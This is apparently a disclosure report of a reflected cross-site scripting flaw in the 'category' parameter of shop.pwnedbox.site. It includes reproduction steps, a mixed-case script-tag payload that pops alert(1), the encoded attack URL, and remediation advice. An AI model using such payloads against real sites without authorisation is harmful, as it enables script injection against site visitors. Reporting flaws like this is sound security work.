## Title
Reflected XSS - shop.pwnedbox.site

## Description
The `category` GET parameter on `shop.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using a mixed-case script tag successfully triggered an `alert(1)` dialog in the browser.

## Steps to Reproduce

1. Open the target URL:
   ```text
   https://shop.pwnedbox.site/index.php
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://shop.pwnedbox.site/index.php?category=hakama%27%22%3C%3E%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

5. Dismiss the alert dialog.

## POC (Proof of Concept)

**Target URL:**  
https://shop.pwnedbox.site/index.php

**HTTP Method:** GET

**Vulnerable Parameter:** `category`

**Payload:**
```html
hakama'"><><sCrIpT>alert(1)</sCrIpT>
```

**Crafted Request URL:**
```text
https://shop.pwnedbox.site/index.php?category=hakama%27%22%3C%3E%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E
```

**Observed Result:**

The supplied JavaScript payload was successfully executed through the `category` parameter. The browser displayed an alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/832b24b4-d535-41ea-a2b6-86018af51c8f" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `category` parameter before rendering its value in HTML.
- Validate and sanitize user-controlled input to prevent HTML and JavaScript injection.
- Implement a restrictive Content Security Policy (CSP) to block unauthorized inline JavaScript execution.
